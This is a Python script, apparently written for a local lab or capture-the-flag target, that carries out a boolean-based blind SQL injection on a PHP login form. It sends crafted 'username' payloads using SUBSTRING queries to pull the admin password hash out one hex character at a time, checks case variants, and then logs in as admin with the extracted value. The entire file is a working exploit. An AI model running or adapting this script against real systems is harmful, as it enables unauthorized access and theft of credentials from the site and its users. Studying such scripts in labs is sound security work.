import requests
import string
import time

base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return '{"response":"password"}' in response.text
    except:
        return None

# Re-extract the password value character by character - make sure we have it exactly right
print("[*] Re-extracting password to confirm exact value...")
password = ""
for pos in range(1, 33):
    for char in string.hexdigits:  # Only hex characters since it's a hash
        payload = f"' or SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}'-- -"
        if send_payload(payload):
            password += char
            print(f"  Position {pos}: '{char}'")
            break
    time.sleep(0.05)

print(f"\n[*] Extracted password: {password}")
print(f"[*] Length: {len(password)}")

# Now check if there's any case sensitivity issue
# Try different case variations
variations = [
    password,
    password.lower(),
    password.upper(),
    password.swapcase()
]

print("\n[*] Checking which variation of password is stored...")
for var in variations:
    payload = f"' or (SELECT password FROM users WHERE username='admin')='{var}'-- -"
    result = send_payload(payload)
    print(f"  Stored password = '{var}': {'TRUE' if result else 'FALSE'}")
    if result:
        print(f"  [+] CONFIRMED: Stored password is: {var}")
        verified_password = var
        break

# Now let's see if maybe we need to look at the login mechanics differently
# The login form uses AJAX with submit: 'submit' (not 'Login')

print("\n[*] Testing login with verified password...")
data = {
    "username": "admin",
    "password": verified_password,
    "submit": "submit"  # The JS uses 'submit', not 'Login'
}

r = requests.post(base_url, data=data, timeout=10)
print(f"Login response: {r.text}")
print(f"Status: {r.status_code}")
print(f"Headers: {r.headers.get('Set-Cookie', 'None')}")

